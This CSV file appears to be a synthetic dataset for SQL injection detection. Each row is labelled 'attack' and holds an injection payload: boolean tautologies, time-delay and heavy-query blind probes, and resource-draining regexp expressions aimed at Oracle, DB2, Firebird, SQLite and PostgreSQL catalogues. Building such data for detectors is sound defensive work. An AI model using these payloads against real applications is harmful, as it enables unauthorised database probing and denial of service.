id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000392,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,8.453153293220618
CTGAN_000393,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,9.86631744883024
CTGAN_000394,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,8.970034598228693
CTGAN_000395,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,8.536173251650741
CTGAN_000396,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,6.065403525177637
CTGAN_000397,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,7.137308049990246
CTGAN_000398,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,7.514440739629019
CTGAN_000399,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,9.351735952637156
CTGAN_000400,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,6.724392632181351
CTGAN_000401,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,6.399662183404208
CTGAN_000402,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,8.975874305433157
CTGAN_000403,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,6.746728633716506
CTGAN_000404,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,8.132439219089084
CTGAN_000405,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,7.8020169737460305
CTGAN_000406,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,6.899123394556795
CTGAN_000407,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,7.707883732050116
CTGAN_000408,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000004,7.509048932264878
CTGAN_000409,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000027,8.95439650608011
CTGAN_000410,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000027,6.966529594764353
CTGAN_000411,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,7.644403108097307
CTGAN_000412,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.168694107862387
CTGAN_000413,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,10.427893261905176
CTGAN_000414,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,5.946883334601106
CTGAN_000415,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,7.418230698113118
CTGAN_000416,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,5.769737568300442
CTGAN_000417,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,6.001512306955932
CTGAN_000418,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,9.200250158455209
CTGAN_000419,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000056,7.545133447700177
CTGAN_000420,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,8.215995637951064
CTGAN_000421,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,6.346728691347769
CTGAN_000422,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,7.4488461490748
CTGAN_000423,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,7.014531717334576
CTGAN_000424,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,6.489772927324559
CTGAN_000425,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,5.8276827225780155
CTGAN_000426,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,7.61658687146108
CTGAN_000427,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,7.832879204733666
CTGAN_000428,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,7.832027156679713
CTGAN_000429,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,5.497904542984959
CTGAN_000430,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,7.014647210123622
CTGAN_000431,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,6.763394291480871
CTGAN_000432,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,7.711565511075644
CTGAN_000433,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,7.1481052306081585
CTGAN_000434,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,6.397693244795392
CTGAN_000435,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,6.275981602321011
CTGAN_000436,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,6.5865190550343975
CTGAN_000437,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,6.2324277977646645
CTGAN_000438,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000056,7.870306316030895
CTGAN_000439,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,6.962119483319984
CTGAN_000440,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,8.08073000039537
CTGAN_000441,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,6.975865805094771
CTGAN_000442,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,7.029058063182503
CTGAN_000443,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000006,6.600378173958187
CTGAN_000444,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,8.150023892461437
CTGAN_000445,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000030,8.782639684423367
CTGAN_000446,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000009,6.762123875972368
CTGAN_000447,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,6.013628497594712
CTGAN_000448,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,8.944422943850643
CTGAN_000449,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,6.717313670152062
CTGAN_000450,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,6.2840785359805205
CTGAN_000451,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000040,4.759477715461944
CTGAN_000452,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,6.9999331948577295
CTGAN_000453,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,7.0909489625878654
CTGAN_000454,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,7.013393134252338
CTGAN_000455,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000061,7.308449652297612
CTGAN_000456,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000056,6.440535307496251
CTGAN_000457,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,6.072490063742914
CTGAN_000458,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,8.041312025527548
CTGAN_000459,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,7.098906504470859
CTGAN_000460,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000056,7.172540373101008
CTGAN_000461,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000061,8.369865572343079
CTGAN_000462,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,8.223371975285673
CTGAN_000463,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,6.620965477528487
CTGAN_000464,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,6.014870020983504
CTGAN_000465,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,6.7420135045940075
